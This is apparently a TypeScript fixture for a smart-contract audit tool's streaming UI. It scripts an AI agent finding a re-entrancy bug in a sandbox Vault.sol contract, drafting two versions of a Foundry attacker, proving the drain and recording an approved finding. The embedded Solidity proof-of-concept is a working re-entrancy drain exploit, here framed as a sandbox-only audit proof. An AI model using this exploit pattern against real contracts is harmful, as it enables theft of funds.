import type { RunEvent, TargetScope } from "../types"

// A canned run that exercises the whole streaming-cognition vocabulary end to
// end: static pre-pass → read → streamed reasoning → streamed prose → a subagent
// handoff → a failed PoC → an operator steer (pending → admitted) → a passing
// replay → a recorded finding. It is the deterministic harness the streaming UI
// is built and visually verified against, and doubles as the acceptance target
// the real engine must reproduce. Every field here uses the exact keys pinned in
// types.ts, so the engine and this fixture match by construction.
//
// The narrative is a textbook checks-effects-interactions bug proven in a
// sandbox Foundry replay — never against live funds (NO-LIVE-HARM).

const scope: TargetScope = {
  id: "vault-local",
  title: "Vault.sol — withdraw() path",
  kind: "local-source",
  blurb: "Operator's own staking vault. Prove any drain in a sandbox replay.",
  entry: "src/Vault.sol",
  signal: "static",
  proofSurface: {
    kind: "sandbox-foundry",
    note: "Exploits run against a funded sandbox fork — never mainnet, never real funds.",
  },
}

// Emit a growing snapshot of `full`, a few words at a time, so the reducer sees
// a realistic throttled stream and the prose visibly types itself on screen.
function grow(
  ev: "thinking-delta" | "assistant-delta",
  conv: string,
  full: string,
  attempt = 0,
  step = 5,
): RunEvent[] {
  const words = full.split(" ")
  const out: RunEvent[] = []
  for (let i = step; i < words.length; i += step) {
    out.push({ ev, conv, attempt, text: words.slice(0, i).join(" ") })
  }
  out.push({ ev, conv, attempt, text: full })
  return out
}

// Same growing-snapshot idea for a document that streams into the artifact pane,
// but grown a few LINES at a time so a source file reads as it is typed. The
// reducer REPLACES on each delta (keyed by id), so a later full revision of the
// same file just re-streams in place.
function growDoc(id: string, full: string, step = 6): RunEvent[] {
  const lines = full.split("\n")
  const out: RunEvent[] = []
  for (let i = step; i < lines.length; i += step) {
    out.push({ ev: "artifact-delta", id, text: lines.slice(0, i).join("\n") })
  }
  out.push({ ev: "artifact-delta", id, text: full })
  return out
}

// The subagent drafts a Foundry attacker. V1 re-enters withdraw() with no bound,
// so it runs past the pool balance and underflows — attempt 1 fails. After the
// operator's steer it is revised (V2) to cap the re-entrancy depth to the funded
// balance, stopping one call before underflow — attempt 2 proves the drain. Our
// own code; it runs only against a funded sandbox fork (NO-LIVE-HARM).
const pocV1 = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

// Re-enters Vault.withdraw() from receive() to drain the pool against a single
// deposit. Runs against a funded sandbox fork — never mainnet, never real funds.
contract ReentryAttack is Test {
    Vault vault;

    function setUp() public {
        vault = new Vault();
        vm.deal(address(vault), 5 ether);
        vault.deposit{value: 1 ether}();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function testReentryDrain() public {
        vault.withdraw(1 ether);
        assertEq(address(vault).balance, 0);
        assertGt(address(this).balance, 1 ether);
    }
}
`

const pocV2 = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

// Re-enters Vault.withdraw() from receive() to drain the pool against a single
// deposit. The depth is capped to the funded balance so it stops one call before
// underflow. Runs against a funded sandbox fork — never mainnet, never real funds.
contract ReentryAttack is Test {
    Vault vault;
    uint256 depth;

    function setUp() public {
        vault = new Vault();
        vm.deal(address(vault), 5 ether);
        vault.deposit{value: 1 ether}();
    }

    receive() external payable {
        if (depth > 0 && address(vault).balance >= 1 ether) {
            depth--;
            vault.withdraw(1 ether);
        }
    }

    function testReentryDrain() public {
        depth = 5;
        vault.withdraw(1 ether);
        assertEq(address(vault).balance, 0);
        assertGt(address(this).balance, 1 ether);
    }
}
`

const reasoning1 =
  "Vault.withdraw() sends ETH with a low-level call before it zeroes the caller's " +
  "balance — the balance write sits after the external call. That is the classic " +
  "checks-effects-interactions violation: a contract that re-enters withdraw() from " +
  "its receive() can call back in before its first balance update ever lands, and " +
  "drain the pool against a single deposit. I want to confirm the state write is " +
  "strictly after the transfer, then prove it with a re-entrant attacker."

const prose1 =
  "Found it. withdraw() transfers ETH before it updates balances, so a malicious " +
  "receiver can re-enter and withdraw repeatedly against one deposit. I'll prove it " +
  "with a Foundry attacker that re-enters until the vault is drained, running against " +
  "a funded sandbox fork — no mainnet, no real funds at risk."

const reasoning2 =
  "The first attempt reverted: the attacker kept re-entering past the pool balance " +
  "and underflowed. The operator is right — I should cap the re-entrancy depth to the " +
  "funded balance so it stops one call before underflow, then assert the vault ends " +
  "empty and the attacker ends richer."

const prose2 =
  "Capping the re-entrancy depth to the pool balance did it. The replay drains the " +
  "sandbox vault from a single 1 ETH deposit and the attacker walks away with the " +
  "whole pool. Recording it as a proven finding."

export const streamingFixture: RunEvent[] = [
  { ev: "scope", scope },
  { ev: "opened", mode: "run" },
  {
    ev: "static-scan",
    suspects: 3,
    engines: ["Slither", "Aderyn"],
    top: [
      { check: "reentrancy-eth", corroborated: true },
      { check: "unchecked-transfer" },
      { check: "arbitrary-send-eth" },
    ],
  },
  { ev: "list_sources" },
  { ev: "read_source", file: "src/Vault.sol" },

  ...grow("thinking-delta", "root", reasoning1),
  ...grow("assistant-delta", "root", prose1),

  {
    ev: "subagent-spawned",
    id: "sub-reentry",
    parent: "root",
    area: "re-entrancy",
    title: "Draft the re-entrant attacker",
  },
  {
    ev: "agent-graph",
    nodes: [
      { id: "root", parent: null, area: "Contracts", title: "Lead", state: "working" },
      {
        id: "sub-reentry",
        parent: "root",
        area: "re-entrancy",
        title: "Draft the re-entrant attacker",
        state: "working",
      },
    ],
  },

  { ev: "artifact-open", id: "art-poc", title: "ReentryAttack.t.sol", kind: "poc", lang: "solidity" },
  ...growDoc("art-poc", pocV1),

  { ev: "run_poc", attempt: 1, contract: "ReentryAttack" },
  { ev: "run_poc-done", contract: "ReentryAttack", passed: false, failed: 1 },

  { ev: "steer-pending", id: "st1", text: "Cap re-entrancy depth to the pool balance so it stops before underflow." },
  ...grow("thinking-delta", "root", reasoning2, 1),
  { ev: "operator-message", id: "st1", text: "Cap re-entrancy depth to the pool balance so it stops before underflow." },

  ...growDoc("art-poc", pocV2),
  { ev: "artifact-done", id: "art-poc" },

  { ev: "subagent-done", id: "sub-reentry", status: "done" },
  {
    ev: "agent-graph",
    nodes: [
      { id: "root", parent: null, area: "Contracts", title: "Lead", state: "working" },
      {
        id: "sub-reentry",
        parent: "root",
        area: "re-entrancy",
        title: "Draft the re-entrant attacker",
        state: "done",
      },
    ],
  },

  { ev: "run_poc", attempt: 2, contract: "ReentryAttack" },
  { ev: "run_poc-done", contract: "ReentryAttack", passed: true },

  ...grow("assistant-delta", "root", prose2, 1),

  {
    ev: "finding",
    id: "f-reentry",
    runId: "fixture:streaming",
    title: "Re-entrancy drains Vault.withdraw()",
    severity: "high",
    module: "Contracts",
    target: "src/Vault.sol",
    proven: true,
    ms: 48213,
  },

  // The replay proof lands as its own pane document — a second artifact beside
  // the PoC. The pane auto-follows to it, so proving the finding swings the pane
  // from the attacker source to the structured proof; the green finding card
  // below reopens it. The finding event above resolved its id, so the proof body
  // fills in the same tick (DEV fixtures carry the finding synchronously).
  { ev: "artifact-open", id: "art-proof", title: "Replay proof — ReentryAttack", kind: "proof" },
  { ev: "artifact-done", id: "art-proof" },

  {
    ev: "approval-pending",
    id: "ap1",
    title: "Re-entrancy drains Vault.withdraw()",
    severity: "high",
    poc: "forge test --match-test testReentryDrain -vvv",
  },
  { ev: "host-deciding", status: "approved" },
  { ev: "approval-decided", status: "approved" },
  { ev: "run-complete", status: "recorded", findingId: "f-reentry" },
  { ev: "closed" },
]
